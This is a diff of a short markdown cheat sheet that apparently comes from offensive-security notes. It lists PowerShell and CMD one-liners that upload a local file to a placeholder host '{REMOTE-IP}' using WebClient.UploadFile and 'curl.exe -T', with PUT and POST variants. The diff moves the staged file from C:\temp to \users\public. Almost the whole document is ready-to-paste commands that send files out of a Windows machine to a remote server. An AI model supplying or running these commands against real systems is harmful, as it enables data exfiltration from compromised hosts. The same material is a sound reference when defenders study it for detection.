@@ -1,19 +1,17 @@
 USING POWERSHELL -
 ------------------------------------------------------------------------------------------------------------------
 
-#### 
+**Web Content Upload**
+    
+    $webClient.UploadFile('http://{REMOTE-IP}/demo.txt', 'PUT', '\users\public\demo.txt')
 
 **Web Content Upload**
     
-    $webClient.UploadFile('http://{REMOTE-IP}/demo.txt', 'PUT', 'C:\temp\demo.txt')
+    powershell.exe -c "curl.exe -T \users\public\demo.txt http://{REMOTE-IP}/demo.txt"
 
 **Web Content Upload**
     
-    powershell.exe -c "curl.exe -T C:\temp\demo.txt http://{REMOTE-IP}/demo.txt"
-
-**Web Content Upload**
-    
-    Start-Process -FilePath "curl.exe" -ArgumentList "-T 'C:\temp\demo.txt' http://{REMOTE-IP}/demo.txt" -NoNewWindow -Wait
+    Start-Process -FilePath "curl.exe" -ArgumentList "-T '\users\public\demo.txt' http://{REMOTE-IP}/demo.txt" -NoNewWindow -Wait
 ------------------------------------------------------------------------------------------------------------------
 
 </br>
@@ -23,11 +21,11 @@ USING CMD -
 
 **Using PUT Method**
     
-    powershell.exe -c "$webClient = New-Object System.Net.WebClient; $webClient.UploadFile('http://{REMOTE-IP}/demo.txt', 'PUT', 'C:\temp\demo.txt')"   
+    powershell.exe -c "$webClient = New-Object System.Net.WebClient; $webClient.UploadFile('http://{REMOTE-IP}/demo.txt', 'PUT', '\users\public\demo.txt')"   
 
 **Using POST Method**
 
-    powershell.exe -c "$webClient = New-Object System.Net.WebClient; $webClient.UploadFile('http://{REMOTE-IP}/demo.txt','C:\temp\demo.txt')"
+    powershell.exe -c "$webClient = New-Object System.Net.WebClient; $webClient.UploadFile('http://{REMOTE-IP}/demo.txt','\users\public\demo.txt')"
 ------------------------------------------------------------------------------------------------------------------
 
 </br>
